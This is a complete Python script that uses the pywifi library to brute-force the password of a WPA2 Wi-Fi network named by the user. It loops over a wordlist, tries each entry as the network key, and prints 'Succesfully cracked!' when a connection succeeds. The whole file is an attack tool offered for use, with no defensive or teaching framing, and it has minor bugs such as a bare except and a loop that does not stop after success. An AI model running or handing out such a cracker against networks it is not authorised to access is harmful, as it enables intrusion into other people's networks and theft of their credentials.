import time
import pywifi


print("made by 'Foxy' xHector")
wordlist=str(input("Enter name of the wordlist file(file name + .txt): "))
f = open(wordlist,"r")
ssid=str(input("Enter ssid (name of wifi): "))

try:
    wifi = pywifi.PyWiFi()
    ifaces = wifi.interfaces()[0]
    ifaces.scan()
    results = ifaces.scan
    
    wifi= pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
except:
    print("error!!!")

def bruteforcer(ssid,wordlist):
    count = 0
    with open(wordlist,'r',encoding='utf8') as words:
        for line in words:
            count +=1
            line = line.split("\n")
            password = line[0]
            main(ssid,password,count)
def main(ssid,password,count):
    profile= pywifi.Profile()
    profile.ssid=ssid
    profile.auth = pywifi.const.AUTH_ALG_OPEN
    profile.akm.append(pywifi.const.AKM_TYPE_WPA2PSK)
    profile.cipher = pywifi.const.CIPHER_TYPE_CCMP
    profile.key = password
    iface.disconnect()
    time.sleep(2)
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.3)
    iface.connect(tmp_profile)
    time.sleep(0.3)
    if iface.status() == pywifi.const.IFACE_CONNECTED:
        time.sleep(1)
        print("Succesfully cracked!","Password is: ",password)
        time.sleep(5)
        return
    else:
        print("Password is not correct. ",password)
bruteforcer(ssid,wordlist)
